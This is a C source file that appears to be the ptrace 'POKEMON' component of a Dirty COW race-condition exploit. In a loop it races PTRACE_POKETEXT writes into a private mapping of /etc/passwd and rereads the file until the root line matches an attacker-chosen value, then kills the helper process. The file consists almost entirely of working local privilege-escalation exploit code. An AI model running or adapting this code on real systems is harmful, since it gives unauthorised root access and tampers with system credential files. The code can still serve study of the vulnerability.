#define INSPECTOR_POKEMON_LEVEL INSPECTOR_LEVEL_ONE
#define INSPECTOR_POKEMON_SUB_LEVEL INSPECTOR_POKEMON_LEVEL INSPECTOR_SUB_LEVEL
#define INSPECTOR_POKEMON_SUB_SUB_LEVEL INSPECTOR_POKEMON_SUB_LEVEL INSPECTOR_SUB_LEVEL

void pokemon_setup(int advisor_pid)
{
    PRINTN_FUNCTION("POKEMON", "main", "", INSPECTOR_RUN, INSPECTOR_POKEMON_SUB_LEVEL);
    // wait ADVISOR (observed process) is ready
    waitpid(advisor_pid, NULL, 0);
    PRINTN_FUNCTION("COWHERD -> POKEMON", "main", "", INSPECTOR_END, INSPECTOR_POKEMON_SUB_LEVEL);
}

void pokemon_read_passwd_root_line(char *line)
{
    PRINTN_FUNCTION("POKEMON", "main", "pokemon_run -> ", INSPECTOR_RUN, INSPECTOR_POKEMON_SUB_SUB_LEVEL);
    FILE *passwd_file_handler;
    passwd_file_handler = fopen("/etc/passwd", "r");
    int i;
    for (i = 0; i < ETC_PASSWD_ROOT_LINE_LENGTH; i++)
    {
        line[i] = fgetc(passwd_file_handler);
    }
    line[i] = 0;
    fclose(passwd_file_handler);
    PRINTN_FUNCTION("POKEMON", "main", "pokemon_run -> ", INSPECTOR_END, INSPECTOR_POKEMON_SUB_SUB_LEVEL)
}

void pokemon_print_passwd_root_line(char *line)
{
    PRINTN_FUNCTION("POKEMON", "main", "pokemon_run -> ", INSPECTOR_RUN, INSPECTOR_POKEMON_SUB_SUB_LEVEL);
    const char *line_expected = ETC_PASSWD_ROOT_LINE_EXPECTED;
    char line_to_print[100];
    strcpy(line_to_print, "");
    char character[2];
    character[1] = 0;
    int c, old_state = -2, new_state;
    for (c = 0; c < ETC_PASSWD_ROOT_LINE_LENGTH; c++)
    {
        new_state = line[c] == line_expected[c];
        if (new_state != old_state)
        {
            if (new_state)
            {
                strcat(line_to_print, FORE_RACE_WINNED);
            }
            else
            {
                strcat(line_to_print, FORE_RACE_TO_WIN);
            }
            old_state = new_state;
        }
        character[0] = line[c];
        strcat(line_to_print, character);
    }
    PRINTN_PROGRESSION(line_to_print)
    PRINTN_FUNCTION("POKEMON", "main", "pokemon_run -> ", INSPECTOR_END, INSPECTOR_POKEMON_SUB_SUB_LEVEL);
}

#define POKEMON_READ_AND_PRINT_PASSWORD_ROOT_LINE \
    pokemon_read_passwd_root_line(line_current);  \
    pokemon_print_passwd_root_line(line_current);

#define POKEMON_UPDATE_CHUNKS_STATE                 \
    for (chunk_index = 0;                           \
         chunk_index < ETC_PASSWD_ROOT_LINE_LENGTH; \
         chunk_index += chunk_lenght)               \
        chunks_state[chunk_index] =                 \
            line_current[chunk_index] != line_expected[chunk_index];

void pokemon_run(int advisor_pid, int race_length, int race_interval)
{
    PRINTN_INFINITE_FUNCTION("COWHERD -> POKEMON", "main", "", INSPECTOR_RUN, INSPECTOR_POKEMON_SUB_LEVEL);
    //int characters_position; // four characters in 32bits, in 64 ?
    int poketext_trials;
    unsigned long poketext_count = 0;
    const char *line_expected = ETC_PASSWD_ROOT_LINE_EXPECTED;
    char line_current[ETC_PASSWD_ROOT_LINE_LENGTH + 1];
    short chunk_lenght = sizeof(unsigned long);
    //short chunks_number = ETC_PASSWD_ROOT_LINE_LENGTH / chunk_lenght;
    short chunks_state[ETC_PASSWD_ROOT_LINE_LENGTH / chunk_lenght]; // 0 done, 1 to poke
    short chunk_index;

    POKEMON_READ_AND_PRINT_PASSWORD_ROOT_LINE
    POKEMON_UPDATE_CHUNKS_STATE

    while (1)
    {
        for (chunk_index = 0;
             chunk_index < ETC_PASSWD_ROOT_LINE_LENGTH;
             chunk_index += chunk_lenght)
        {
            if (chunks_state[chunk_index])
            {
                usleep(race_interval);
                for (poketext_trials = 0; poketext_trials < race_length; poketext_trials++)
                {
                    ptrace(PTRACE_POKETEXT, // to thread advisor of ADVISOR processus
                           advisor_pid,
                           common_passwd_file_memory_mapping + chunk_index,
                           *((long *)(line_expected + chunk_index)));
                    poketext_count++;
                }
            }
        }
        POKEMON_READ_AND_PRINT_PASSWORD_ROOT_LINE
        if (strcmp(ETC_PASSWD_ROOT_LINE_EXPECTED, line_current) == 0)
        {
            break;
        }
        POKEMON_UPDATE_CHUNKS_STATE
    }
    kill(advisor_pid, SIGTERM);
    wait(NULL);

    FORMAT_COUNTER(poketext_count)
    char line[100];
    sprintf(line, "POKEMON:%s ptrace poketext\n", number);
    PRINTN_PROGRESSION(line);

    PRINTN_INFINITE_FUNCTION("POKEMON", "main", "", INSPECTOR_END, INSPECTOR_POKEMON_SUB_LEVEL);
    PRINTN_PROCESS("POKEMON", INSPECTOR_END, INSPECTOR_POKEMON_LEVEL)
    printf("\n");
    exit(0);
}
